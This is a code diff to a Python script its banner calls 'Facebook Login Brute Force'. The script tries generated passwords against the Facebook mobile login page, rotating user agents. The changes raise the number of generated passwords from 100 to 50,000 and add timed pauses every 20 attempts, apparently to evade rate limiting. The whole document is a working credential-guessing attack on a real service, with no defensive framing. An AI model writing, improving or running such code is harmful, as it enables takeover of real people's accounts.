@@ -20,6 +20,9 @@ MIN_PASSWORD_LENGTH = 6
 MAIN_FB_DOMAIN = 'https://mbasic.facebook.com'
 LOGIN_URL = MAIN_FB_DOMAIN + '/login.php'
 DEFAULT_TIMEOUT = 2
+WAIT_EVERY_N_ATTEMPTS = 20
+WAIT_DURATION_SECONDS = 60  # 1 دقائق
+
 USER_AGENTS = []
 with open('user-agents.txt', 'rt', newline='', encoding='utf-8') as file:
     USER_AGENTS = file.read().splitlines()
@@ -115,7 +118,7 @@ def generate_passwords(user):
     passwords.append(user + "admin")
     return passwords
 
-def generate_strong_passwords(count=100):
+def generate_strong_passwords(count=50000):
     import string
     english_letters = string.ascii_letters
     digits = string.digits
@@ -144,12 +147,7 @@ def args():
 
 # =============> Main <=============
 def main(args=None):
-    print(CliColors.HEADER + """
- ____  __    ___  ____  ____   __    __  __ _     ____  ____  _  _  ____  ____     ____  __  ____   ___  ____ 
-(  __)/ _\  / __)(  __)(  _ \ /  \  /  \(  / )___(  _ \(  _ \/ )( \(_  _)(  __)___(  __)/  \(  _ \ / __)(  __)
- ) _)/    \( (__  ) _)  ) _ ((  O )(  O ))  ((___)) _ ( )   /) \/ (  )(   ) _)(___)) _)(  O ))   /( (__  ) _) 
-(__) \_/\_/ \___)(____)(____/ \__/  \__/(__\_)   (____/(__\_)\____/ (__) (____)   (__)  \__/(__\_) \___)(____)
-""")
+    print(CliColors.HEADER + """\n== Facebook Login Brute Force ==\n""")
 
     if args and args.single_password and args.password_list:
         print(CliColors.FAIL + "[x] You can't use single password with password list.")
@@ -203,8 +201,21 @@ def main(args=None):
             if LoginOp[0]:
                 flag = LoginOp
                 break
-            # تأخير بين المحاولات
-            time.sleep(args.delay)  # تأخير بين المحاولات بالثواني
+
+            if index % WAIT_EVERY_N_ATTEMPTS == 0:
+                _log.write_colored("[*] Reached {} attempts. Waiting for {} seconds...".format(index, WAIT_DURATION_SECONDS), 'cyan')
+
+                print() 
+                for remaining in range(WAIT_DURATION_SECONDS, 0, -1):
+                    mins, secs = divmod(remaining, 60)
+                    time_format = f"{mins:02d}:{secs:02d}"
+                    sys.stdout.write(f"\rwaiting ....... {time_format}")
+                    sys.stdout.flush()
+                    time.sleep(1)
+                print()  
+                time.sleep(WAIT_DURATION_SECONDS)
+
+            time.sleep(args.delay)
         except Exception as ex:
             _log.write_colored("[!] Caught Exception: {}".format(str(ex)), 'yellow')
         index += 1
